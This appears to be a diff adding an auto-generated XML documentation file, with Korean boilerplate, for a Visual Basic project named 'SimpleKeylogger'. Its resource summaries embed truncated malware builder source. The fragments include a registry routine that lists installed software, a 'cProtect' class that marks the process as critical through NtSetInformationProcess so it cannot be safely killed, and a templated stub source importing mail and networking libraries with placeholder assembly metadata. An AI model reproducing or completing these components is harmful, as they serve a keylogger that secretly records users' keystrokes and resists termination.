@@ -1,0 +1,84 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+SimpleKeylogger
+</name>
+</assembly>
+<members>
+<member name="T:SimpleKeylogger.My.Resources.Resources">
+<summary>
+  지역화된 문자열 등을 찾기 위한 강력한 형식의 리소스 클래스입니다.
+</summary>
+</member>
+<member name="P:SimpleKeylogger.My.Resources.Resources.ResourceManager">
+<summary>
+  이 클래스에서 사용하는 캐시된 ResourceManager 인스턴스를 반환합니다.
+</summary>
+</member>
+<member name="P:SimpleKeylogger.My.Resources.Resources.Culture">
+<summary>
+  이 강력한 형식의 리소스 클래스를 사용하여 모든 리소스 조회에 대한 현재 스레드의 CurrentUICulture
+  속성을 재정의합니다.
+</summary>
+</member>
+<member name="P:SimpleKeylogger.My.Resources.Resources.Junk">
+<summary>
+  Public Function GetSoftware() As String
+        Dim Software As String = Nothing
+        Dim SoftwareKey As String = &quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot;
+        Using rk As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(SoftwareKey)
+            For Each skName As String In rk.GetSubKeyNames()
+                Using sk As Microsoft.Win32.RegistryKey = rk.OpenSubKey(skName)
+                    Try
+                        If Not (sk.GetValue(&quot;DisplayName&quot;[나머지 문자열은 잘림]&quot;;과(와) 유사한 지역화된 문자열을 찾습니다.
+</summary>
+</member>
+<member name="P:SimpleKeylogger.My.Resources.Resources.Protect">
+<summary>
+  
+
+   Public Class cProtect
+        Public Sub ProtectProcess(bProtect As Boolean)
+            Dim hProc As IntPtr = GetCurrentProcess()
+            Dim bResult As Boolean = GetPrivilegs(SE_DEBUG_NAME)
+            Dim ProcessInfo As IntPtr = IntPtr.Zero
+
+            If bProtect = True Then
+                ProcessInfo = New IntPtr(29)
+            End If
+
+            NtSetInformationProcess(hProc, iBreakTermination, New IntPtr(VarPtr(ProcessInfo)), Marshal.SizeOf(ProcessInfo))
+        End Sub
+
+ [나머지 문자열은 잘림]&quot;;과(와) 유사한 지역화된 문자열을 찾습니다.
+</summary>
+</member>
+<member name="P:SimpleKeylogger.My.Resources.Resources.r_5">
+<summary>
+  (아이콘)과(와) 유사한 System.Drawing.Icon 형식의 지역화된 리소스를 찾습니다.
+</summary>
+</member>
+<member name="P:SimpleKeylogger.My.Resources.Resources.Source">
+<summary>
+  Imports Microsoft.VisualBasic
+Imports System.Reflection
+Imports System.Net.Mail
+Imports System.Net
+Imports System.Text
+Imports System
+Imports System.Windows.Forms
+^IMPORT^
+
+&lt;Assembly: AssemblyTitle(&quot;^1^&quot;)&gt; 
+&lt;Assembly: AssemblyDescription(&quot;^2^&quot;)&gt; 
+&lt;Assembly: AssemblyCompany(&quot;^3^&quot;)&gt; 
+&lt;Assembly: AssemblyProduct(&quot;^4^&quot;)&gt; 
+&lt;Assembly: AssemblyCopyright(&quot;^5^&quot;)&gt; 
+&lt;Assembly: AssemblyTrademark(&quot;^6^&quot;)&gt; 
+&lt;Assembly: AssemblyVersion(&quot;^%1^.^%2^.^%3^.^%4^&quot;)&gt; 
+&lt;Assembly: AssemblyFileVersion(&quot;^%1^.^%2^.^%3^.^%[나머지 문자열은 잘림]&quot;;과(와) 유사한 지역화된 문자열을 찾습니다.
+</summary>
+</member>
+</members>
+</doc>
